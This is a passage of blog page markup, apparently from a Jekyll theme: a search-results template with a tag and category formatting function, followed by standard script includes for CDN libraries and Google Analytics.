pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-F1XTFEDQT6"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-F1XTFEDQT6'); }); </script>
